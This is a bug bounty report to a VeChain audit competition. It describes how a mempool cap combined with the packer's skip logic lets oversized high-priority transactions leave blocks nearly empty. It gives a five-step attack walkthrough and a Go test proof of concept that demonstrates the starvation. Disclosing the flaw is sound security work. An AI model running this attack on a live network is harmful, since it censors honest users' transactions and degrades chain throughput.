# 56045 bc insight block packing starvation via oversized priority transactions

**Submitted on Oct 9th 2025 at 18:50:50 UTC by @OxPrince for** [**Attackathon | VeChain Hayabusa Upgrade**](https://immunefi.com/audit-competition/vechain-hayabusa-upgrade-attackathon)

* **Report ID:** #56045
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/vechain/thor/compare/master...release/hayabusa>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

### Brief/Intro

The mempool `wash` routine sorts executable transactions by effective priority fee and truncates the slice to the global limit (`txpool/tx_pool.go:498-514`). When block construction starts, the packer takes this capped snapshot (`cmd/thor/node/packer_loop.go:119-147`) and, for each entry, calls `flow.Adopt`. If executing a transaction would exceed the remaining block gas but there is still room for a minimum-sized clause, `flow.Adopt` yields `errTxNotAdoptableNow` instead of failing hard (`packer/flow.go:157-163`). The packer simply skips to the next transaction on that same priority-sorted list; it never falls back to lower-fee entries that were pruned out. An attacker who keeps the executable slice saturated with “almost full block” transactions can therefore ensure that every post-seed candidate is skipped, leaving most of the gas limit unused.

### Vulnerability Details

* `wash` evicts any executable transactions beyond `Options.Limit`, favouring the highest priority fees (`txpool/tx_pool.go:498-514`). Legitimate lower-paying transactions never reach `Executables()` once the attacker fills the cap.
* `pack` captures a single `Executables()` snapshot per block and does not refresh it (`cmd/thor/node/packer_loop.go:119-149`). Any transaction skipped with `errTxNotAdoptableNow` simply persists in the pool for the next block.
* `flow.Adopt` returns `errTxNotAdoptableNow` whenever the candidate needs more gas than remains yet the block still has capacity for the minimum clause (`packer/flow.go:157-163`), reflecting the intent to try “smaller” transactions later. Because the trimmed list no longer contains smaller ones, this degenerates into a permanent skip.
* Default node settings (`cmd/thor/main.go:51-55`) cap the executable set at 10 000 entries with at most 128 per account. An attacker can span \~79 accounts to populate the cap with high-gas transactions while complying with per-account quotas.

## Exploit Walkthrough

{% stepper %}
{% step %}

### Prepare funding and accounts

Pre-fund \~79 accounts with enough VTHO to satisfy the pending-cost check (`txpool/tx_pool.go:290-305`) for 128 transactions each. With gas ≈9 980 000 and gas price ≈ base fee, each pending transaction ties up ≈100 VTHO but is not spent if it never executes.
{% endstep %}

{% step %}

### Submit oversized high-priority transactions

Each account submits transactions whose declared gas is just below the block gas limit (≈10 000 000) and sets priority fees marginally above prevailing demand so they dominate the sorted list.
{% endstep %}

{% step %}

### Seed a small transaction before packing

Just before a block is packed, submit a single small “seed” transaction with an equal or higher priority fee so it sorts to the top. The remaining entries in the executable slice are all oversized.
{% endstep %}

{% step %}

### Packing causes skipping of oversized entries

During packing, the seed executes, leaving the block with <9 980 000 gas available. Every oversized transaction now triggers `errTxNotAdoptableNow`, so the packer skips them and never pulls in lower-fee transactions (they were truncated in the previous steps). The block is published mostly empty.
{% endstep %}

{% step %}

### Repeat to sustain the effect

Repeat a fresh seed transaction before each block; the oversized pool persists indefinitely because it is never executed or evicted.
{% endstep %}
{% endstepper %}

## Impact Details

* Sustained throughput degradation: blocks can be reduced to a single minimum transaction while the chain stays live.
* Honest users’ transactions are continually dropped from the executable set, effectively censoring them until the attacker stops.
* Attack cost is limited to temporarily parking VTHO as pending collateral; the oversized transactions never execute, so the attacker does not burn gas.

## References

Add any relevant links to documentation or code

## Proof of Concept

```rust
package txpool

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/vechain/thor/v2/genesis"
	"github.com/vechain/thor/v2/packer"
	"github.com/vechain/thor/v2/thor"
	"github.com/vechain/thor/v2/tx"
)

func TestHighGasPriorityTransactionsStarveBlockCapacity(t *testing.T) {
	const (
		poolLimit        = 3
		poolLimitPerAcct = 8
	)

	pool := newPool(poolLimit, poolLimitPerAcct, &thor.NoFork)
	defer pool.Close()

	best := pool.repo.BestBlockSummary()
	blockRef := tx.NewBlockRef(best.Header.Number())
	expiration := best.Header.Number() + 100

	dev := devAccounts
	recip := dev[5].Address

	buildLegacy := func(from genesis.DevAccount, nonce uint64, gas uint64, gasPriceCoef uint8) *tx.Transaction {
		clause := tx.NewClause(&recip)
		builder := tx.NewBuilder(tx.TypeLegacy).
			ChainTag(pool.repo.ChainTag()).
			Clause(clause).
			Gas(gas).
			GasPriceCoef(gasPriceCoef).
			BlockRef(blockRef).
			Expiration(expiration).
			Nonce(nonce)
		return tx.MustSign(builder.Build(), from.PrivateKey)
	}

	seedTxGas := uint64(thor.TxGas + thor.ClauseGas)
	seedTx := buildLegacy(dev[0], 0, seedTxGas, 255)
	require.NoError(t, pool.Add(seedTx))

	largeGas := best.Header.GasLimit() - 1000
	largeTx1 := buildLegacy(dev[1], 0, largeGas, 254)
	require.NoError(t, pool.Add(largeTx1))

	largeTx2 := buildLegacy(dev[2], 0, largeGas, 253)
	require.NoError(t, pool.Add(largeTx2))

	honestLowPriority := buildLegacy(dev[3], 0, seedTxGas, 1)
	err := pool.Add(honestLowPriority)
	require.Error(t, err)
	require.Contains(t, err.Error(), "pool is full")

	executables, _, _, err := pool.wash(best)
	require.NoError(t, err)
	pool.executables.Store(executables)

	require.Len(t, executables, poolLimit)
	require.Equal(t, seedTx.ID(), executables[0].ID())
	require.Equal(t, largeTx1.ID(), executables[1].ID())
	require.Equal(t, largeTx2.ID(), executables[2].ID())
	require.Nil(t, pool.Get(honestLowPriority.ID()))

	proposer := dev[0]
	pkr := packer.New(pool.repo, pool.stater, proposer.Address, &proposer.Address, pool.forkConfig, 0)

	now := uint64(time.Now().Unix())
	flow, _, err := pkr.Schedule(best, now)
	require.NoError(t, err)

	require.NoError(t, flow.Adopt(seedTx))

	err = flow.Adopt(largeTx1)
	require.Error(t, err)
	require.True(t, packer.IsTxNotAdoptableNow(err))

	err = flow.Adopt(largeTx2)
	require.Error(t, err)
	require.True(t, packer.IsTxNotAdoptableNow(err))

	newBlock, stage, receipts, err := flow.Pack(proposer.PrivateKey, 0, false)
	require.NoError(t, err)

	blockTxs := newBlock.Transactions()
	require.Len(t, blockTxs, 1)
	require.Equal(t, seedTx.ID(), blockTxs[0].ID())
	require.Equal(t, uint64(seedTxGas), newBlock.Header().GasUsed())

	require.Len(t, receipts, 1)
	require.True(t, receipts[0].GasUsed <= seedTxGas)

	require.NotNil(t, pool.Get(largeTx1.ID()))
	require.NotNil(t, pool.Get(largeTx2.ID()))

	_ = stage
}
```
